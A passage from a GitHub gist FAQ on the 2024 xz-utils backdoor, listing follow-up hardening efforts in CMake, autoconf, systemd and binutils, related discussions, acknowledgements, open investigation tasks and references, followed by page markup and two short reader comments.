<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Tangential efforts as a result of this incident</h2><a id="user-content-tangential-efforts-as-a-result-of-this-incident" class="anchor" aria-label="Permalink: Tangential efforts as a result of this incident" href="#tangential-efforts-as-a-result-of-this-incident"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">This is for suggesting specific changes which are being considered as a result of this.</p>
<ul dir="auto">
<li>CMake: <a href="https://gitlab.kitware.com/cmake/cmake/-/issues/25846" rel="nofollow">Consider hardening check_c_source_compiles</a> - <a href="https://gitlab.kitware.com/cmake/cmake/-/merge_requests/9391" rel="nofollow">MR</a></li>
<li>bug-autoconf: <a href="https://savannah.gnu.org/support/?111048" rel="nofollow">Add a syntax check to code snippets</a></li>
<li>bug-autoconf: <a href="https://lists.gnu.org/archive/html/bug-autoconf/2024-03/msg00000.html" rel="nofollow">autoreconf --force seemingly does not forcibly update everything</a></li>
<li>systemd: <a href="https://github.com/systemd/systemd/issues/32028" data-hovercard-type="issue" data-hovercard-url="/systemd/systemd/issues/32028/hovercard">Reduce dependencies of libsystemd</a>
<ul dir="auto">
<li><em>Note</em>: There was prior work already on this in e.g. <a class="issue-link js-issue-link" data-error-text="Failed to load title" data-id="2161889299" data-permission-text="Title is private" data-url="https://github.com/systemd/systemd/issues/31550" data-hovercard-type="pull_request" data-hovercard-url="/systemd/systemd/pull/31550/hovercard" href="https://github.com/systemd/systemd/pull/31550">systemd/systemd#31550</a>. While it was initially thought that this <a href="https://openwall.com/lists/oss-security/2024/03/31/9" rel="nofollow">may have</a> have caused acceleration of plans to backdoor xz, as the systemd changes had not yet landed in a release, the timing doesn't seem to work out..
<ul dir="auto">
<li><em>xz-5.6.0</em>, the first known-backdoored version, was released on 2024-02-26.</li>
<li>Per Debian's <a href="https://tracker.debian.org/pkg/xz-utils" rel="nofollow">package tracker</a>, <em>xz-5.6.0</em> was first added on that same day. This predates the systemd PR which was opened on 2024-02-29.</li>
<li>That said, the <a href="https://github.com/systemd/systemd/pull/31131" data-hovercard-type="pull_request" data-hovercard-url="/systemd/systemd/pull/31131/hovercard">original PR</a> to move systemd towards more <code>dlopen()</code> for e.g. <code>kmod</code> was opened on 2024-01-30.</li>
<li>On the same day, a systemd developer <a href="https://github.com/systemd/systemd/pull/31131#issuecomment-1917954597" data-hovercard-type="pull_request" data-hovercard-url="/systemd/systemd/pull/31131/hovercard">suggested</a> extending the approach to compression libraries.</li>
</ul>
</li>
</ul>
</li>
<li>systemd: <a href="https://github.com/systemd/systemd/pull/32234" data-hovercard-type="pull_request" data-hovercard-url="/systemd/systemd/pull/32234/hovercard">RFC: expose dlopen() dependencies in an ELF section</a>
<ul dir="auto">
<li><a href="https://lwn.net/Articles/969908/" rel="nofollow">LWN</a></li>
</ul>
</li>
<li>groff: <a href="https://lists.gnu.org/archive/html/groff/2024-03/msg00211.html" rel="nofollow">[PATCH] Distribute bootstrap and bootstrap.conf</a></li>
<li>GNU binutils: <a href="https://inbox.sourceware.org/binutils/CACKH++ZCwhA9n9GfsWPmBQgsSrvfeOpLha0=UCpHzPDD8vQpNQ@mail.gmail.com/T/#u" rel="nofollow">Remove dependency on libjansson</a>
<ul dir="auto">
<li>This is being proposed by @rui314, the maintainer of mold. Rui also wrote about the risks to linkers in <a href="https://x.com/rui314/status/1774286434335338965" rel="nofollow">https://x.com/rui314/status/1774286434335338965</a>.</li>
</ul>
</li>
<li>openssh
<ul dir="auto">
<li>Note that as covered above, OpenSSH are looking at removing the need for downstreams to patch in libsystemd by implementing a library-less version of the same functionality.</li>
<li>Andres Freund noticed an interesting <a href="https://bugzilla.mindrot.org/show_bug.cgi?id=3675" rel="nofollow">tangential bug/area for improvement</a> when analysing the exploit, which would avoid checking against algorithms disabled by configuration. (This is not a vulnerability in OpenSSH and it wouldn't have prevented any of this, but it's come out of this whole thing nonetheless).</li>
</ul>
</li>
<li>Auditing Linux distribution packages with <a href="https://github.com/hlein/distro-backdoor-scanner">distro-backdoor-scanner</a></li>
<li>esr's <a href="https://gitlab.com/esr/autodafe/" rel="nofollow">autodafe</a> to aid conversion from autotools -&gt; Makefiles</li>
<li>backseat-signed: <a href="https://lists.debian.org/debian-devel/2024/04/msg00088.html" rel="nofollow">New supply-chain security tool: backseat-signed</a>
<ul dir="auto">
<li>github: <a href="https://github.com/kpcyrd/backseat-signed">https://github.com/kpcyrd/backseat-signed</a></li>
</ul>
</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Discussions in the wake of this</h2><a id="user-content-discussions-in-the-wake-of-this" class="anchor" aria-label="Permalink: Discussions in the wake of this" href="#discussions-in-the-wake-of-this"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">This is for linking to interesting general discussions, rather than specific changes being suggested (see above).</p>
<ul dir="auto">
<li>automake: <a href="https://lists.gnu.org/archive/html/automake/2024-03/msg00007.html" rel="nofollow">GNU Coding Standards, automake, and the recent xz-utils backdoor</a></li>
<li>bug-gnulib: <a href="https://lists.gnu.org/archive/html/bug-gnulib/2024-04/msg00239.html" rel="nofollow">git repositories vs. tarballs</a></li>
<li>fedora-devel: <a href="https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/thread/YWMNOEJ34Q7QLBWQAB5TM6A2SVJFU4RV/" rel="nofollow">Three steps we could take to make supply chain attacks a bit harder</a></li>
<li>debian-devel: <a href="https://lists.debian.org/debian-devel/2024/04/msg00103.html" rel="nofollow">Upstream dist tarball transparency (was Re: Validating tarballs against git repositories)</a></li>
<li>oss-security: <a href="https://www.openwall.com/lists/oss-security/2024/04/17/3" rel="nofollow">Make your own backdoor: CFLAGS code injection, Makefile injection, pkg-config</a></li>
</ul>
<p dir="auto">Non-mailing list proposals:</p>
<ul dir="auto">
<li>Simon Josefsson's blog: <a href="https://blog.josefsson.org/2024/04/01/towards-reproducible-minimal-source-code-tarballs-please-welcome-src-tar-gz/" rel="nofollow">Towards reproducible minimal source code tarballs? On *-src.tar.gz</a></li>
<li>Simon Josefsson's blog: <a href="https://blog.josefsson.org/2024/04/13/reproducible-and-minimal-source-only-tarballs/" rel="nofollow">Reproducible and minimal source-only tarballs</a></li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Acknowledgements</h2><a id="user-content-acknowledgements" class="anchor" aria-label="Permalink: Acknowledgements" href="#acknowledgements"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li>Andres Freund who discovered the issue and reported it to <em>linux-distros</em> and then <em>oss-security</em>.</li>
<li>All the hard-working security teams helping to coordinate a response and push out fixes.</li>
<li>Xe Iaso who resummarized this page for readability.</li>
<li>Everybody who has provided me tips privately, in #tukaani, or in comments on this gist.</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">Meta</h2><a id="user-content-meta" class="anchor" aria-label="Permalink: Meta" href="#meta"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Please try to keep comments on the gist constrained to editorial changes I need to make, new sources, etc.</strong></p>
<p dir="auto">There are various places to theorise &amp; such, please see e.g. <a href="https://discord.gg/TPz7gBEE" rel="nofollow">https://discord.gg/TPz7gBEE</a> (for both, reverse engineering and OSint). (I'm not associated with that Discord but the link is going around, so...)</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">Response to questions</h3><a id="user-content-response-to-questions" class="anchor" aria-label="Permalink: Response to questions" href="#response-to-questions"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li>
<p dir="auto">A few people have asked why Jia Tan followed me (@thesamesam) on GitHub. #tukaani was a small community on IRC before this kicked off (~10 people, currently has ~350). I've been in #tukaani for a few years now. When the move from self-hosted infra to github was being planned and implemented, I was around and starred &amp; followed the new Tukaani org pretty quickly.</p>
</li>
<li>
<p dir="auto">I'm referenced in one of the <a href="https://git.tukaani.org/?p=xz.git;a=commit;h=72d2933bfae514e0dbb123488e9f1eb7cf64175f" rel="nofollow">commits</a> in the original oss-security post that works around noise from the IFUNC resolver. This was a legitimate issue which applies to IFUNC resolvers in general. The GCC bug it led to (<a href="https://gcc.gnu.org/PR114115" rel="nofollow">PR114115</a>) has been fixed.</p>
<ul dir="auto">
<li>On reflection, there may have been a missed opportunity as maybe I should have looked into why I couldn't hit the reported Valgrind problems from Fedora on Gentoo, but this isn't the place for my own reflections nor is it IMO the time yet.</li>
</ul>
</li>
</ul>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">TODO for this doc</h3><a id="user-content-todo-for-this-doc" class="anchor" aria-label="Permalink: TODO for this doc" href="#todo-for-this-doc"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li>Add a table of releases + signer?</li>
<li>Include the injection script after the macro</li>
<li>Mention detection?</li>
<li>Explain the bug-autoconf thing maybe wrt serial</li>
<li>Explain dist tarballs, why we use them, what they do, link to autotools docs, etc
<ul dir="auto">
<li>"Explaining the history of it would be very helpful I think.  It also explains how a single person was able to insert code in an open source project that no one was able to peer review.  It is pragmatically impossible, even if technically possible once you know the problem is there, to peer review a tarball prepared in this manner."</li>
</ul>
</li>
</ul>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">TODO overall</h3><a id="user-content-todo-overall" class="anchor" aria-label="Permalink: TODO overall" href="#todo-overall"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">Anyone can and should work on these. I'm just listing them so people have a rough idea of what's left.</p>
<ul dir="auto">
<li><strong>Ensuring Lasse Collin and xz-utils is supported</strong>, even long after the fervour is over</li>
<li>Reverse engineering the payload (it's still fairly early days here on this)
<ul dir="auto">
<li>Once finished, tell people whether:
<ul dir="auto">
<li>the backdoor did anything else than waiting for connections for RCE, like:
<ul dir="auto">
<li>call home (send found private keys, etc)</li>
<li>load/execute additional rogue code</li>
<li>did some other steps to infest the system (like adding users, authorized_keys, etc.) or whether it can be certainly said, that it didn't do so</li>
</ul>
</li>
<li>other attack vectors than via sshd were possible</li>
<li>whether people (who had the compromised versions) can feel fully safe
<em>if</em> they either had sshd not running OR at least not publicly
accessible (e.g. because it was behind a firewall, nat, iptables,
etc.)</li>
</ul>
</li>
</ul>
</li>
<li>Auditing all possibly-tainted xz-utils commits</li>
<li>Investigate other paths for <code>sshd</code> to get <code>liblzma</code> in its process (not just via <code>libsystemd</code>, or at least not directly)
<ul dir="auto">
<li>This is already partly done and it looks like none exist, but it would be nice to be sure.</li>
</ul>
</li>
<li>Checking other projects for similar injection mechanisms (e.g. similar build system lines)
<ul dir="auto">
<li>See <a href="https://github.com/hlein/distro-backdoor-scanner">distro-backdoor-scanner</a></li>
<li><a href="https://codesearch.debian.net/" rel="nofollow">https://codesearch.debian.net/</a> may be helpful</li>
</ul>
</li>
<li>Diff and review all "golden" upstream tarballs used by distros against the output of creating a tarball from the git tag for all packages.</li>
<li>Check other projecs which (recently) introduced IFUNC, as suggested by <em>thegrugq</em>.
<ul dir="auto">
<li>This isn't a bad idea even outside of potential backdoors, given how brittle IFUNC is.</li>
</ul>
</li>
<li>???</li>
</ul>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">References and other reading material</h2><a id="user-content-references-and-other-reading-material" class="anchor" aria-label="Permalink: References and other reading material" href="#references-and-other-reading-material"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<ul dir="auto">
<li><a href="https://lwn.net/Articles/967180/" rel="nofollow">LWN - A backdoor in xz</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4" rel="nofollow">oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise</a></li>
<li><a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor" rel="nofollow">Evan Boehs - Everything I know about the XZ backdoor</a></li>
<li><a href="https://tukaani.org/xz-backdoor/" rel="nofollow">Tukaani - XZ Utils backdoor</a></li>
<li><a href="https://robmensching.com/blog/posts/2024/03/30/a-microcosm-of-the-interactions-in-open-source-projects/" rel="nofollow">Rob Mensching - A Microcosm of the interactions in Open Source projects</a></li>
<li><a href="https://research.swtch.com/xz-timeline" rel="nofollow">Russ Cox - Timeline of the xz open source attack</a></li>
<li><a href="https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and" rel="nofollow">Rhea's Substack - XZ Backdoor: Times, damned times, and scams</a></li>
<li><a href="https://lwn.net/Articles/967866/" rel="nofollow">LWN - Free software's not-so-eXZellent adventure</a></li>
<li><a href="https://lwn.net/Articles/967192/" rel="nofollow">LWN - How the XZ backdoor works</a></li>
<li><a href="https://lwn.net/Articles/969908/" rel="nofollow">LWN - Identifying dependencies used via dlopen()</a></li>
<li><a href="https://news.opensuse.org/2024/04/12/learn-from-the-xz-backdoor/" rel="nofollow">openSUSE - What we need to take away from the XZ Backdoor</a></li>
<li><a href="https://www.cisa.gov/news-events/news/lessons-xz-utils-achieving-more-sustainable-open-source-ecosystem" rel="nofollow">CISA - Lessons from XZ Utils: Achieving a More Sustainable Open Source Ecosystem</a></li>
<li><a href="https://openssf.org/blog/2024/04/15/open-source-security-openssf-and-openjs-foundations-issue-alert-for-social-engineering-takeovers-of-open-source-projects/" rel="nofollow">OpenSSF - Open Source Security (OpenSSF) and OpenJS Foundations Issue Alert for Social Engineering Takeovers of Open Source Projects</a></li>
<li><a href="https://github.com/przemoc/xz-backdoor-links">https://github.com/przemoc/xz-backdoor-links</a></li>
</ul>
</article>
  </div>

  </div>
</div>


        <a name="comments"></a>
        <div class="js-quote-selection-container" data-quote-markdown=".js-comment-body">
          <div class="js-discussion "
          >
            <div class="ml-md-6 pl-md-3 ml-0 pl-0">
              
  <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="ajax-pagination-form js-ajax-pagination" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/load_comments" accept-charset="UTF-8" method="get">
    <input type="hidden" name="partial" id="partial" value="gists/timeline_marker" autocomplete="off" class="form-control" />
    <input type="hidden" name="before_comment_id" id="before_comment_id" value="5021136" autocomplete="off" class="form-control" />
    <input type="hidden" name="mark_as_unread" id="mark_as_unread" value="0" autocomplete="off" class="form-control" />
    <button name="button" type="submit" class="ajax-pagination-btn" data-disable-with="Loading...">Load earlier comments...</button>
</form>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/804661?s=80&amp;v=4" width="40" height="40" alt="@flybyray" /></a>
    </div>
    <div id="gistcomment-5021136" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021136-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray">flybyray</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021136#gistcomment-5021136" id="gistcomment-5021136-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T11:46:52Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">And my dear Ray, there’s already a NON-MALICIOUS EXPLANATION as to why an sh is used: it turns on the bcj flags.</p>
</blockquote>
<p dir="auto">Better safe than sorry. Ask yourself what a NON-*-EXPLANATION is worth. Especially an explanation which is at all wrong - shows just that supplier has no experience.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021136" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="OXYEhqVhuaZpegJeMeOt51EyYN6mIy2_XMz-rVdBpZ59RIOpTNOrYXffS059un6-LlZJjD-9hHe6UOo7WhowwA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021136/edit_form?textarea_id=gistcomment-5021136-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/Artoria2e5/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Artoria2e5"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/6459309?s=80&amp;v=4" width="40" height="40" alt="@Artoria2e5" /></a>
    </div>
    <div id="gistcomment-5021427" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021427-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/Artoria2e5/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/Artoria2e5">Artoria2e5</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021427#gistcomment-5021427" id="gistcomment-5021427-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T16:33:02Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
